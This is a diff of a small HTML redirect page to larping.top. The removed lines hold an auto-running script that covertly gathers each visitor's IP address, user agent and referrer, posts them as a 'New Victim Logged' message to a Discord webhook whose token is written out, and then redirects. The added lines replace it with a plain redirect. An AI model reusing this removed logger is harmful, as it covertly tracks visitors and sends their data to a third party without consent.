@@ -1,46 +1,11 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Processing...</title>
-  <script>
-    async function logAndRedirect() {
-      try {
-        // Grab their IP using a public API
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const userIP = ipData.ip;
-        
-        // Get additional shit
-        const userAgent = navigator.userAgent;
-        const referrer = document.referrer || 'direct';
-        const timestamp = new Date().toISOString();
-        
-        // Prepare payload for Discord webhook
-        const payload = {
-          content: `**New Victim Logged**\nIP: ${userIP}\nUser Agent: ${userAgent}\nReferrer: ${referrer}\nTime: ${timestamp}\nTarget Redirect: https://larping.top`
-        };
-        
-        // Fire that shit to Discord
-        await fetch('https://discord.com/api/webhooks/1482532095393009819/kDhM23GNw0vxO2uNKPyLQsy7vat7iFnLS_5WEcAAKYnFcUT8m5FTAPOtuJFJQWGZF4oM', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-      } catch(e) {
-        // Who gives a fuck if logging fails? Still redirect.
-        console.log("Logging fucked but who cares", e);
-      } finally {
-        // Yeet them to the destination no matter what
-        window.location.replace("https://larping.top");
-      }
-    }
-    
-    // Fire that bitch immediately
-    logAndRedirect();
-  </script>
+  <meta http-equiv="refresh" content="0; url=https://larping.top">
+  <title>Redirecting...</title>
+  <script>window.location.replace("https://larping.top");</script>
 </head>
 <body>
-  <p>Sending you somewhere... 🚀</p>
+  <p>Redirecting to <a href="https://larping.top">larping.top</a>...</p>
 </body>
 </html>
